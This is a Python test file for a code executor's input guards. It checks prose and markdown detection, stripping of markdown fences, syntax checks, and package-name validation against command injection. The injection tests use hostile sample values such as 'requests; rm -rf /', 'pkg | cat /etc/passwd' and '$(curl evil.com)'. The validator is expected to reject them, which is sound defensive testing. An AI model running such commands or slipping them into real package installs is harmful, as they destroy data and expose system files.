"""Tests for CodeExecutorTool input validation guards.

Covers the module-level utility functions and the instance-level
``_is_safe_package_name`` helper that protect against:
- Plain text / markdown submitted as Python code
- Markdown blobs stuffed into triple-quoted string assignments
- Markdown fences wrapping code snippets
- Syntax errors (truncated LLM output)
- Command injection via package names
"""

from __future__ import annotations

import pytest

from app.domain.services.tools.code_executor import (
    CodeExecutorTool,
    Language,
    _check_python_syntax,
    _looks_like_markdown_blob_assignment,
    _looks_like_plain_text,
    _strip_outer_markdown_fence,
)


# ---------------------------------------------------------------------------
# _looks_like_plain_text
# ---------------------------------------------------------------------------
class TestLooksLikePlainText:
    """Detect prose / markdown that is not Python code."""

    def test_empty_string(self) -> None:
        assert _looks_like_plain_text("") is False

    def test_pure_python(self) -> None:
        code = "import json\ndata = json.loads('{}')\nprint(data)"
        assert _looks_like_plain_text(code) is False

    def test_markdown_report(self) -> None:
        text = (
            "# Research Report\n\n"
            "This document explores recent trends.\n"
            "- First finding is significant.\n"
            "- Second finding follows."
        )
        assert _looks_like_plain_text(text) is True

    def test_numbered_list_prose(self) -> None:
        text = "1. Install the package.\n2. Configure the settings.\n3. Run the command."
        assert _looks_like_plain_text(text) is True

    def test_python_with_comments(self) -> None:
        code = "# This is a comment\nimport os\nresult = os.listdir('.')"
        assert _looks_like_plain_text(code) is False

    def test_single_sentence(self) -> None:
        # Short text with one prose indicator — below threshold
        text = "This is a brief note."
        assert _looks_like_plain_text(text) is False

    def test_heading_only_markdown(self) -> None:
        text = "## Section A\n\nThe analysis shows improvement.\n## Section B\n\nFurther results below."
        assert _looks_like_plain_text(text) is True


# ---------------------------------------------------------------------------
# _looks_like_markdown_blob_assignment
# ---------------------------------------------------------------------------
class TestLooksLikeMarkdownBlobAssignment:
    """Detect triple-quoted markdown stuffed into a Python variable."""

    def test_normal_python(self) -> None:
        code = 'x = 42\nprint("hello world")'
        assert _looks_like_markdown_blob_assignment(code) is False

    def test_short_code(self) -> None:
        code = 'report = """# Hello"""'
        assert _looks_like_markdown_blob_assignment(code) is False

    def test_markdown_blob(self) -> None:
        code = (
            'report = """\n'
            "# Executive Summary\n\n"
            "The market analysis indicates strong growth in Q3.\n"
            "Key drivers include cloud adoption and AI investment.\n"
            '"""\n'
        )
        assert _looks_like_markdown_blob_assignment(code) is True

    def test_markdown_blob_with_file_write(self) -> None:
        code = (
            'report = """\n'
            "# Executive Summary\n\n"
            "The market analysis shows growth.\n"
            '"""\n'
            'with open("report.md", "w") as f:\n'
            "    f.write(report)\n"
        )
        # Contains file I/O — should be treated as valid code
        assert _looks_like_markdown_blob_assignment(code) is False

    def test_raw_string_blob(self) -> None:
        code = "content = r'''\n# Design Document\n\nArchitecture overview and component details follow.\n'''\n"
        assert _looks_like_markdown_blob_assignment(code) is True


# ---------------------------------------------------------------------------
# _strip_outer_markdown_fence
# ---------------------------------------------------------------------------
class TestStripOuterMarkdownFence:
    """Remove surrounding markdown fences from code snippets."""

    def test_no_fence(self) -> None:
        code = 'print("hello")'
        assert _strip_outer_markdown_fence(code, Language.PYTHON) == code

    def test_python_fence(self) -> None:
        fenced = '```python\nprint("hello")\n```'
        assert _strip_outer_markdown_fence(fenced, Language.PYTHON) == 'print("hello")'

    def test_generic_fence(self) -> None:
        fenced = '```\nprint("hello")\n```'
        assert _strip_outer_markdown_fence(fenced, Language.PYTHON) == 'print("hello")'

    def test_js_fence(self) -> None:
        fenced = "```javascript\nconsole.log('hi');\n```"
        assert _strip_outer_markdown_fence(fenced, Language.JAVASCRIPT) == "console.log('hi');"

    def test_bash_fence(self) -> None:
        fenced = "```bash\necho hello\n```"
        assert _strip_outer_markdown_fence(fenced, Language.BASH) == "echo hello"

    def test_wrong_language_fence(self) -> None:
        # If the fence says javascript but language is python, don't strip
        fenced = "```javascript\nconsole.log('hi');\n```"
        assert _strip_outer_markdown_fence(fenced, Language.PYTHON) == fenced

    def test_multiline_fenced_code(self) -> None:
        fenced = "```python\nimport os\nfiles = os.listdir('.')\nfor f in files:\n    print(f)\n```"
        expected = "import os\nfiles = os.listdir('.')\nfor f in files:\n    print(f)"
        assert _strip_outer_markdown_fence(fenced, Language.PYTHON) == expected

    def test_py_alias(self) -> None:
        fenced = '```py\nprint("hi")\n```'
        assert _strip_outer_markdown_fence(fenced, Language.PYTHON) == 'print("hi")'

    def test_sh_alias(self) -> None:
        fenced = "```sh\nls -la\n```"
        assert _strip_outer_markdown_fence(fenced, Language.BASH) == "ls -la"

    def test_shell_alias(self) -> None:
        fenced = "```shell\nls -la\n```"
        assert _strip_outer_markdown_fence(fenced, Language.BASH) == "ls -la"


# ---------------------------------------------------------------------------
# _check_python_syntax
# ---------------------------------------------------------------------------
class TestCheckPythonSyntax:
    """Pre-execution syntax checks catch truncated / malformed code."""

    def test_valid_code(self) -> None:
        assert _check_python_syntax("x = 1 + 2\nprint(x)") is None

    def test_unclosed_triple_quote(self) -> None:
        result = _check_python_syntax('report = """hello')
        assert result is not None
        assert "SyntaxError" in result

    def test_missing_bracket(self) -> None:
        result = _check_python_syntax("data = [1, 2, 3")
        assert result is not None
        assert "SyntaxError" in result

    def test_truncated_function(self) -> None:
        result = _check_python_syntax("def foo():\n    x = 1\n    y = ")
        assert result is not None

    def test_multiline_valid(self) -> None:
        code = "def add(a, b):\n    return a + b\n\nresult = add(1, 2)\nprint(result)"
        assert _check_python_syntax(code) is None

    def test_plain_text_hint(self) -> None:
        text = "# Research Report\n\nThis report covers AI trends.\n- Finding one.\n- Finding two."
        result = _check_python_syntax(text)
        # "This report covers AI trends." is not valid Python syntax,
        # so a SyntaxError is expected. The _looks_like_plain_text guard
        # would catch this earlier in the real flow.
        assert result is not None
        assert "SyntaxError" in result


# ---------------------------------------------------------------------------
# _is_safe_package_name  (instance method via CodeExecutorTool)
# ---------------------------------------------------------------------------
class TestIsSafePackageName:
    """Package name validation prevents command injection in pip/npm installs."""

    @pytest.fixture
    def executor(self) -> CodeExecutorTool:
        """Minimal executor with mock sandbox for testing _is_safe_package_name."""
        from unittest.mock import AsyncMock

        return CodeExecutorTool(sandbox=AsyncMock())

    def test_simple_package(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("requests") is True

    def test_package_with_version(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("requests>=2.28.0") is True

    def test_package_with_dots(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("python-dotenv") is True

    def test_package_with_underscore(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("my_package") is True

    def test_injection_semicolon(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("requests; rm -rf /") is False

    def test_injection_pipe(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("pkg | cat /etc/passwd") is False

    def test_injection_backtick(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("`whoami`") is False

    def test_injection_subshell(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("$(curl evil.com)") is False

    def test_empty_string(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("") is False

    def test_spaces_rejected(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("my package") is False

    def test_version_equality(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("flask==2.3.0") is True

    def test_version_not_equal(self, executor: CodeExecutorTool) -> None:
        assert executor._is_safe_package_name("flask!=1.0") is True
